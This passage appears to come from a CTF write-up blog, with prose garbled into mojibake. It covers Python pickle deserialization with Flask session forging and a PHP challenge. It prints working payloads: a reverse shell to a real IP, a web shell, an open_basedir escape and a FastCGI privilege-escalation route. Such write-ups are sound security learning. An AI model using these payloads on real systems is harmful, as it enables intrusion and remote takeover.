path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹è§æœ‰keyç›´æ¥è¯»å–/proc/self/environ å°±èƒ½è¯»åˆ°äº†</p>
<p>çœ‹è§pickå°±çŸ¥é“æ˜¯Pythonçš„ååºåˆ—åŒ–äº† = =</p>
<p>å…³äºPythonçš„ååºåˆ—åŒ–æˆ‘ä¹‹å‰å·²ç»å†™è¿‡äº†</p>
<p>æ‰€ä»¥è¿™é‡Œç›´æ¥é€ å®ƒå°±è¡Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    uname = <span class="string">&#x27;ys&#x27;</span></span><br><span class="line">    is_admin = <span class="number">1</span></span><br><span class="line">    __repr__ = <span class="keyword">lambda</span> o: o.uname</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>  (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; /123&#x27;)&quot;</span>,))</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ä½ è¿™æ ·ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;tyskill&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system, (<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/81.68.201.65/8001 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>éƒ½å¯ä»¥é€ å‡ºæ¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">u = pickle.dumps(User())</span><br><span class="line">print(b64encode(u).decode())</span><br></pre></td></tr></table></figure>

<p>ä¹‹åsessionä¼ªé€ ç”¨githubçš„å·¥å…·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;noraj&#x2F;flask-session-cookie-manager</span><br></pre></td></tr></table></figure>



<p>ç”Ÿæˆ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> -t <span class="string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC8xMjMnKZSFlFKULg==&#x27;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>æ‹¿è¿‡å»æ‰“</p>
<h1 id="è¸©å‘ï¼š"><a href="#è¸©å‘ï¼š" class="headerlink" title="è¸©å‘ï¼š"></a>è¸©å‘ï¼š</h1><h2 id="1-base64"><a href="#1-base64" class="headerlink" title="1.base64"></a>1.base64</h2><p>é¦–å…ˆåŠ å¯†æ˜¯ç”Ÿæˆäº†ä¸€ä¸²base64çš„å€¼ï¼Œä½ è¦ä¼ªé€ sessionçš„è¯å¿…é¡»ä½¿ç”¨å­—å…¸çš„æ–¹å¼ï¼Œæ‰€ä»¥é€šè¿‡æä¸€ä¸ªå‡å­—å…¸çš„æ–¹å¼æ¥ç”Ÿæˆï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;u&#x27;</span>:&#123;<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;base64çš„å€¼&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-ç¯å¢ƒé—®é¢˜"><a href="#2-ç¯å¢ƒé—®é¢˜" class="headerlink" title="2.ç¯å¢ƒé—®é¢˜"></a>2.ç¯å¢ƒé—®é¢˜</h2><p>é¶æœºæ˜¯Linuxç¯å¢ƒï¼Œæœ¬åœ°æ˜¯Windowsç¯å¢ƒï¼Œè¿™ä¸¤ä¸ªç¯å¢ƒä¸‹dumpsçš„ç»“æœä¸­åºåˆ—åŒ–å­—ç¬¦ä¸²å£°æ˜ç³»ç»Ÿçš„æ ‡è¯†ç¬¦ä¸åŒï¼šLinux=&gt;posixï¼›Windows=&gt;ntï¼Œéœ€è¦å°†è„šæœ¬æ”¾åœ¨Linuxç¯å¢ƒä¸‹ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</p>
<h2 id="3-BUUå¥½åƒå¼¹ä¸å‡ºæ¥shell"><a href="#3-BUUå¥½åƒå¼¹ä¸å‡ºæ¥shell" class="headerlink" title="3.BUUå¥½åƒå¼¹ä¸å‡ºæ¥shell"></a>3.BUUå¥½åƒå¼¹ä¸å‡ºæ¥shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># User = type(&#x27;User&#x27;, (object,), &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;uname&#x27;: &#x27;tyskill&#x27;,</span></span><br><span class="line"><span class="comment">#     &#x27;is_admin&#x27;: 1,</span></span><br><span class="line"><span class="comment">#     &#x27;__repr__&#x27;: lambda o: o.uname,</span></span><br><span class="line"><span class="comment">#     &#x27;__reduce__&#x27;: lambda o: (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/81.68.201.65/8001 0&gt;&amp;1&#x27;&quot;,))</span></span><br><span class="line"><span class="comment"># &#125;)</span></span><br></pre></td></tr></table></figure>

<p>æ— è®ºæ˜¯è‡ªå·±æçš„è¿˜æ˜¯ç½‘ä¸Šæ‰¾çš„ï¼Œéƒ½æä¸å‡ºæ¥- -</p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>OnePointerPHP</title>
    <url>/2021/05/12/OnePointerPHP/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">    $count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">        $user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">        setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $user=<span class="keyword">new</span> User;</span><br><span class="line">    $user-&gt;count=<span class="number">1</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>PHPçš„æ•´æ•°å‹æ˜¯æœ‰ä¸Šé™çš„ï¼Œæ ¹æ®å¤§ä½¬çš„åšå®¢ï¼š</p>
<p>åœ¨ PHP ä¸­ï¼Œæ•´å‹æ•°æ˜¯æœ‰ä¸€ä¸ªèŒƒå›´çš„ï¼Œå¯¹äº32ä½çš„æ“ä½œç³»ç»Ÿï¼Œæœ€å¤§çš„æ•´å‹æ˜¯2147483647ï¼Œå³2çš„31æ¬¡æ–¹ï¼Œæœ€å°ä¸º-2çš„31æ¬¡æ–¹ã€‚å¦‚æœç»™å®šçš„ä¸€ä¸ªæ•´æ•°è¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰çš„èŒƒå›´ï¼Œå°†ä¼šè¢«è§£é‡Šä¸ºæµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚åŒæ ·å¦‚æœæ‰§è¡Œçš„è¿ç®—ç»“æœè¶…å‡ºäº†æ•´å‹ï¼ˆintegerï¼‰èŒƒå›´ï¼Œä¹Ÿä¼šè¿”å›æµ®ç‚¹å‹ï¼ˆfloatï¼‰ã€‚</p>
<p>æˆ‘ä»¬æ¥å¤ç°ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">123445566</span>;</span><br><span class="line">$b = <span class="number">9223372036854775807</span>;</span><br><span class="line">$c = <span class="number">9223372036854775808</span>;</span><br><span class="line">$d = <span class="number">50000000000000</span> * <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">var_dump($c);</span><br><span class="line">var_dump($d);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸éš¾å‘ç°è·³è½¬ä»5807-&gt;5808çš„æ—¶å€™å˜æˆäº†doubleç±»å‹ã€‚</p>
<p><img src="OnePointerPHP/image-20210512161147845.png" alt="image-20210512161147845"></p>
<p>è¿™ä¹Ÿå°±è¯´æ˜å½“è¶…è¿‡çš„æ—¶å€™ä¼šå­˜åœ¨ä¸€æ¬¡éšå½¢çš„æ•°æ®è½¬æ¢ï¼Œè€Œæ•°ç»„åœ¨åˆ›å»ºçš„æ—¶å€™å·²ç»å°†å†…å­˜å®šä¸‹æ¥äº†ï¼ˆç›²çŒœï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userconut = <span class="number">9223372036854775806</span>;</span><br><span class="line">$count[++$userconut] = <span class="number">1</span>;</span><br><span class="line">$count[] = <span class="number">1</span>;</span><br><span class="line">print_r($count);</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¿™æ®µæ—¶é—´ä¼šæŠ¥é”™ï¼Œåˆ©ç”¨è¿™ä¸ªç»•è¿‡æŠ¥é”™ã€‚</p>
<p>å†™å…¥æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;%3fphp+eval(\$_POST[1])%3b%3f&gt;&quot;</span>)%<span class="number">3</span>b</span><br></pre></td></tr></table></figure>

<p>ç”¨èšå‰‘ğŸ”—ä¸Šå»ï¼Œå‘ç°è¢«basedir é™åˆ¶äº†ï¼Œç»•è¿‡çš„è¯éœ€è¦ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">&#x27;mayi&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;mayi&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents($_GET[<span class="string">&#x27;file&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>æ–‡ç« è§£é‡Šï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;LLeaves&#x2F;p&#x2F;13210005.html</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†å›¾æ–¹ä¾¿æˆ‘ç›´æ¥å†™åœ¨äº†1.phpé‡Œé¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mayi077.gitee.io&#x2F;2021&#x2F;05&#x2F;04&#x2F;%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">&#x27;mayi&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;mayi&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents($_GET[<span class="string">&#x27;file&#x27;</span>]));</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<h1 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h1><p><img src="OnePointerPHP/image-20210512173802306.png" alt="image-20210512173802306"></p>
<h1 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h1><p>è¿™æ—¶å€™æƒ³è¦è¯»flagç»“æœå‘ç°æ— æ³•è¯»å–ã€‚å›åˆ°phpinfoå½“ä¸­ï¼Œæˆ‘ä»¬å‘ç°æˆ‘ä»¬æ˜¯æœ‰fpmçš„ã€‚</p>
<p><img src="OnePointerPHP/image-20210512171824810.png" alt="image-20210512171824810"></p>
<p>è€Œphpæ˜¯å¯ä»¥ç”¨è¿™ä¸ªè¿›è¡Œææƒçš„ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾fpmçš„é…ç½®æ–‡ä»¶</p>
<p>è¯»å–æ–‡ä»¶ /proc/self/cmdline</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;91eedfff-1313-4748-954f-100343ceda6d.node3.buuoj.cn&#x2F;2.php?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿0 0</p>
<p>è€Œselfçš„æ„ä¹‰æ˜¯ï¼š</p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“å¯ä»¥é€šè¿‡/proc/$pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚</p>
<p>ä½†æ˜¯å¾ˆæ˜¾ç„¶çš„å¯åŠ¨FPMæœåŠ¡ä¸æ˜¯æœ¬è¿›ç¨‹ï¼Œæˆ‘ä»¬ç”¨burpçˆ†ç ´ä¸€ä¸‹è¿›ç¨‹</p>
<p><img src="OnePointerPHP/image-20210512172438615.png" alt="image-20210512172438615"></p>
<p>å¾—åˆ°37ï¼Œæˆ‘ä»¬å†å»è¯»å–è¯¥æ–‡ä»¶æ¥æ‰¾åˆ°fpmçš„å¼€æ”¾ç«¯å£</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> string(5346) &quot;;;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">; FPM Configuration ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">; All relative paths in this configuration file are relative to PHP&#x27;s install</span><br><span class="line">; prefix (/usr/local). This prefix can be dynamically changed by using the</span><br><span class="line">; &#x27;-p&#x27; argument from the command line.</span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Global Options ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">; Pid file</span><br><span class="line">; Note: the default prefix is /usr/local/var</span><br><span class="line">; Default Value: none</span><br><span class="line">;pid = run/php-fpm.pid</span><br><span class="line"></span><br><span class="line">; Error log file</span><br><span class="line">; If it&#x27;s set to &quot;syslog&quot;, log is sent to syslogd instead of being written</span><br><span class="line">; into a local file.</span><br><span class="line">; Note: the default prefix is /usr/local/var</span><br><span class="line">; Default Value: log/php-fpm.log</span><br><span class="line">;error_log = log/php-fpm.log</span><br><span class="line"></span><br><span class="line">; syslog_facility is used to specify what type of program is logging the</span><br><span class="line">; message. This lets syslogd specify that messages from different facilities</span><br><span class="line">; will be handled differently.</span><br><span class="line">; See syslog(3) for possible values (ex daemon equiv LOG_DAEMON)</span><br><span class="line">; Default Value: daemon</span><br><span class="line">;syslog.facility = daemon</span><br><span class="line"></span><br><span class="line">; syslog_ident is prepended to every message. If you have multiple FPM</span><br><span class="line">; instances running on the same server, you can change the default value</span><br><span class="line">; which must suit common needs.</span><br><span class="line">; Default Value: php-fpm</span><br><span class="line">;syslog.ident = php-fpm</span><br><span class="line"></span><br><span class="line">; Log level</span><br><span class="line">; Possible Values: alert, error, warning, notice, debug</span><br><span class="line">; Default Value: notice</span><br><span class="line">;log_level = notice</span><br><span class="line"></span><br><span class="line">; Log limit on number of characters in the single line (log entry). If the</span><br><span class="line">; line is over the limit, it is wrapped on multiple lines. The limit is for</span><br><span class="line">; all logged characters including message prefix and suffix if present. However</span><br><span class="line">; the new line character does not count into it as it is present only when</span><br><span class="line">; logging to a file descriptor. It means the new line character is not present</span><br><span class="line">; when logging to syslog.</span><br><span class="line">; Default Value: 1024</span><br><span class="line">;log_limit = 4096</span><br><span class="line"></span><br><span class="line">; Log buffering specifies if the log line is buffered which means that the</span><br><span class="line">; line is written in a single write operation. If the value is false, then the</span><br><span class="line">; data is written directly into the file descriptor. It is an experimental</span><br><span class="line">; option that can potentionaly improve logging performance and memory usage</span><br><span class="line">; for some heavy logging scenarios. This option is ignored if logging to syslog</span><br><span class="line">; as it has to be always buffered.</span><br><span class="line">; Default value: yes</span><br><span class="line">;log_buffering = no</span><br><span class="line"></span><br><span class="line">; If this number of child processes exit with SIGSEGV or SIGBUS within the time</span><br><span class="line">; interval set by emergency_restart_interval then FPM will restart. A value</span><br><span class="line">; of &#x27;0&#x27; means &#x27;Off&#x27;.</span><br><span class="line">; Default Value: 0</span><br><span class="line">;emergency_restart_threshold = 0</span><br><span class="line"></span><br><span class="line">; Interval of time used by emergency_restart_interval to determine when</span><br><span class="line">; a graceful restart will be initiated.  This can be useful to work around</span><br><span class="line">; accidental corruptions in an accelerator&#x27;s shared memory.</span><br><span class="line">; Available Units: s(econds), m(inutes), h(ours), or d(ays)</span><br><span class="line">; Default Unit: seconds</span><br><span class="line">; Default Value: 0</span><br><span class="line">;emergency_restart_interval = 0</span><br><span class="line"></span><br><span class="line">; Time limit for child processes to wait for a reaction on signals from master.</span><br><span class="line">; Available units: s(econds), m(inutes), h(ours), or d(ays)</span><br><span class="line">; Default Unit: seconds</span><br><span class="line">; Default Value: 0</span><br><span class="line">;process_control_timeout = 0</span><br><span class="line"></span><br><span class="line">; The maximum number of processes FPM will fork. This has been designed to control</span><br><span class="line">; the global number of processes when using dynamic PM within a lot of pools.</span><br><span class="line">; Use it with caution.</span><br><span class="line">; Note: A value of 0 indicates no limit</span><br><span class="line">; Default Value: 0</span><br><span class="line">; process.max = 128</span><br><span class="line"></span><br><span class="line">; Specify the nice(2) priority to apply to the master process (only if set)</span><br><span class="line">; The value can vary from -19 (highest priority) to 20 (lowest priority)</span><br><span class="line">; Note: - It will only work if the FPM master process is launched as root</span><br><span class="line">;       - The pool process will inherit the master process priority</span><br><span class="line">;         unless specified otherwise</span><br><span class="line">; Default Value: no set</span><br><span class="line">; process.priority = -19</span><br><span class="line"></span><br><span class="line">; Send FPM to background. Set to &#x27;no&#x27; to keep FPM in foreground for debugging.</span><br><span class="line">; Default Value: yes</span><br><span class="line">;daemonize = yes</span><br><span class="line"></span><br><span class="line">; Set open file descriptor rlimit for the master process.</span><br><span class="line">; Default Value: system defined value</span><br><span class="line">;rlimit_files = 1024</span><br><span class="line"></span><br><span class="line">; Set max core size rlimit for the master process.</span><br><span class="line">; Possible Values: &#x27;unlimited&#x27; or an integer greater or equal to 0</span><br><span class="line">; Default Value: system defined value</span><br><span class="line">;rlimit_core = 0</span><br><span class="line"></span><br><span class="line">; Specify the event mechanism FPM will use. The following is available:</span><br><span class="line">; - select     (any POSIX os)</span><br><span class="line">; - poll       (any POSIX os)</span><br><span class="line">; - epoll      (linux &gt;= 2.5.44)</span><br><span class="line">; - kqueue     (FreeBSD &gt;= 4.1, OpenBSD &gt;= 2.9, NetBSD &gt;= 2.0)</span><br><span class="line">; - /dev/poll  (Solaris &gt;= 7)</span><br><span class="line">; - port       (Solaris &gt;= 10)</span><br><span class="line">; Default Value: not set (auto detection)</span><br><span class="line">;events.mechanism = epoll</span><br><span class="line"></span><br><span class="line">; When FPM is built with systemd integration, specify the interval,</span><br><span class="line">; in seconds, between health report notification to systemd.</span><br><span class="line">; Set to 0 to disable.</span><br><span class="line">; Available Units: s(econds), m(inutes), h(ours)</span><br><span class="line">; Default Unit: seconds</span><br><span class="line">; Default value: 10</span><br><span class="line">;systemd_interval = 10</span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Pool Definitions ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">; Multiple pools of child processes may be started with different listening</span><br><span class="line">; ports and different management options.  The name of the pool will be</span><br><span class="line">; used in logs and stats. There is no limitation on the number of pools which</span><br><span class="line">; FPM can handle. Your system will tell you anyway :)</span><br><span class="line"></span><br><span class="line">; Include one or more files. If glob(3) exists, it is used to include a bunch of</span><br><span class="line">; files from a glob(3) pattern. This directive can be used everywhere in the</span><br><span class="line">; file.</span><br><span class="line">; Relative path can also be used. They will be prefixed by:</span><br><span class="line">;  - the global prefix if it&#x27;s been set (-p argument)</span><br><span class="line">;  - /usr/local otherwise</span><br><span class="line">include=etc/php-fpm.d/*.conf</span><br><span class="line">&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ç°å¹¶æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ã€‚ã€‚æ²¡æœ‰æ‰¾åˆ°ç«¯å£ï¼Œä½†æ˜¯å®ƒåŒ…å«äº†å¦å¤–ä¸€ä¸ªconfï¼Œæˆ‘ä»¬å†å»æ‰«ä¸€å“ˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include&#x3D;etc&#x2F;php-fpm.d&#x2F;*.conf</span><br></pre></td></tr></table></figure>

<p><img src="OnePointerPHP/image-20210512173236764.png" alt="image-20210512173236764"></p>
<p>è‰ï¼Œå‚»äº†,ç™¾åº¦çš„æ—¶å€™è¯´æ˜¯ç”¨<a href="http://www.confçš„,ç»“æœæˆ‘å½“æ—¶è·¯å¾„å†™é”™äº†,,/">www.confçš„ï¼Œç»“æœæˆ‘å½“æ—¶è·¯å¾„å†™é”™äº†ï¼Œï¼Œ</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#x3D;var_dump(scandir(&#39;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#39;));</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ‰«ç›®å½•çš„è¯ä¹Ÿèƒ½å¾—åˆ°</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">group = www-data</span><br><span class="line"></span><br><span class="line">; The address on which to accept FastCGI requests.</span><br><span class="line">; Valid syntaxes are:</span><br><span class="line">;   &#x27;ip.add.re.ss:port&#x27;    - to listen on a TCP socket to a specific IPv4 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#x27;[ip:6:addr:ess]:port&#x27; - to listen on a TCP socket to a specific IPv6 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#x27;port&#x27;                 - to listen on a TCP socket to all addresses</span><br><span class="line">;                            (IPv6 and IPv4-mapped) on a specific port;</span><br><span class="line">;   &#x27;/path/to/unix/socket&#x27; - to listen on a unix socket.</span><br><span class="line">; Note: This value is mandatory.</span><br><span class="line">listen = 127.0.0.1:9001</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ç°æŠŠç«¯å£å¼€åœ¨äº†9001</p>
<p>å†ä¹‹åï¼Œå™”å™”å’šï¼Œéœ€è¦åˆ©ç”¨è¯¥æ“ä½œææƒï¼Œè¿™é‡Œå®Œå…¨ä¸æ‡‚å°±åªèƒ½è·Ÿç€å¤ç°äº†ï¼Œåªèƒ½è¯´Pç‰›å¤ªå¼ºå•¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gist.github.com&#x2F;phith0n&#x2F;9615e2420f31048f7e30f3937356cf75 EXPåœ°å€</span><br><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;penetration&#x2F;fastcgi-and-php-fpm.html Pç‰›çš„è®²è§£</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://www.leavesongs.com/penetration/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™ (Author: phithon)</a></li>
</ul>
<p>æ‹“å±•ï¼š</p>
